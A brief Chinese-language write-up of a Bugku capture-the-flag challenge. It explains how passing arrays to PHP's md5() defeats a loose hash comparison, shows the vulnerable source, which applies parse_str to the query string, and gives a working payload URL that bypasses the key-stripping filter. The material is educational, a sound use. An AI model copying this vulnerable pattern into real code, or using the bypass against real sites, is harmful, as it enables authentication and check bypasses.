---
因为md5\(\)和sha1\(\)不能处理数组，当输入数组的时候就会报错，返回false，从而使一些判断条件成立
---
## 直接上一个bugku的题说明一下问题
```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');  //返回url包括问号后面的内容
$str = substr($str,1); //去掉问号
$str = str_replace('key','',$str); //key替换成空
parse_str($str);//这里最后$str = key1[]= adsa&&key2=adsa
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

payload：[http://120.24.86.145:8002/web16/index.php?kkeyey1\[\]=1&&kkeyey2\[\]=2](http://120.24.86.145:8002/web16/index.php?kkeyey1[]=1&&kkeyey2[]=2)